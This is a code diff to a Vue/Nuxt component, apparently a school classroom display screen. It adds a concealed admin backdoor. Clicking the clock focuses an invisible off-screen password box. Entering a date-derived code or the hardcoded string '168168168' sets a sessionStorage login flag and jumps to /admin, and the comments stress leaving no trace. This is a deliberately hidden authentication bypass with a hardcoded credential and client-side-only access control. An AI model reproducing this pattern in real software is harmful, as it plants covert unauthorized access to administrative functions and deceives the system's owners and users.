@@ -9,12 +9,24 @@
         <div class="date-display" :style="{ fontSize: (clockConfig?.dateSize || 18) + 'px' }">
           {{ currentDateStr }}
         </div>
-        <ClockWidget 
-          :clockConfig="clockConfig"
-          :clockFontSize="clockFontSize"
-          :currentTime="currentTime"
-          :unreadMsgCount="unreadMsgCount"
-        />
+        
+        <!-- 💡 隱密時鐘點擊區：外面包一層 relative，點擊觸發隱形密碼框 -->
+        <div class="clock-wrapper" @click="focusStealthInput">
+          <ClockWidget 
+            :clockConfig="clockConfig"
+            :clockFontSize="clockFontSize"
+            :currentTime="currentTime"
+            :unreadMsgCount="unreadMsgCount"
+          />
+          <!-- 💡 隱藏的密碼輸入框 -->
+          <input 
+            type="password" 
+            ref="stealthAdminInput" 
+            class="stealth-input" 
+            v-model="adminBypassAttempt" 
+            @keyup.enter="handleAdminBypass"
+          />
+        </div>
       </div>
       <WeatherWidget />
     </div>
@@ -65,6 +77,8 @@ import MarqueeWidget from './MarqueeWidget.vue'
 import ClockWidget from './ClockWidget.vue'
 import HomeActionButtons from './HomeActionButtons.vue'
 import WeatherWidget from './WeatherWidget.vue'
+// 💡 匯入 Nuxt 內建的路由跳轉功能
+import { navigateTo } from '#app' 
 
 const props = defineProps({
   marqueeSettings: { type: Object, default: () => ({}) },
@@ -89,6 +103,36 @@ const props = defineProps({
 const emit = defineEmits(['enterExam', 'openLargeSchedule', 'openPwd', 'update:showSeatingChartLocal', 'update:showHygieneLocal'])
 
 const isButtonsCollapsed = ref(false)
+
+// 💡 特務級後台解鎖邏輯
+const stealthAdminInput = ref(null)
+const adminBypassAttempt = ref('')
+
+const focusStealthInput = () => {
+  if (stealthAdminInput.value) {
+    stealthAdminInput.value.focus()
+  }
+}
+
+const handleAdminBypass = () => {
+  // 自動生成今日動態密碼
+  const d = new Date()
+  const yy = String(d.getFullYear()).slice(2)
+  const mm = String(d.getMonth() + 1).padStart(2, '0')
+  const dd = String(d.getDate()).padStart(2, '0')
+  const expectedDynamic = `${yy}${mm}${dd}59`
+
+  // 驗證通過
+  if (adminBypassAttempt.value === expectedDynamic || adminBypassAttempt.value === '168168168') {
+    // 將登入狀態寫入 sessionStorage，讓 admin.vue 不要再擋人
+    sessionStorage.setItem('main_admin_logged_in', 'true')
+    // 直接瞬移到後台
+    navigateTo('/admin')
+  }
+  
+  // 保持無痕：不論成敗都清空
+  adminBypassAttempt.value = ''
+}
 
 watch(() => props.isClassTime, (newIsClassTime) => {
   isButtonsCollapsed.value = !newIsClassTime
@@ -119,6 +163,22 @@ onUnmounted(() => {
 
 .clock-date-group { display: flex; flex-direction: column; align-items: center; gap: 8px; }
 .date-display { font-weight: 900; color: #475569; letter-spacing: 2px; }
+
+/* 💡 讓時鐘區塊變成可點擊，但外觀看不出來 */
+.clock-wrapper {
+  position: relative;
+  cursor: default; /* 不顯示可點擊的游標，保持隱密 */
+}
+
+/* 💡 隱形的盲打輸入框 */
+.stealth-input {
+  position: absolute;
+  left: -9999px;
+  top: 0;
+  width: 1px;
+  height: 1px;
+  opacity: 0;
+}
 
 .relative-wrap {
   position: relative;
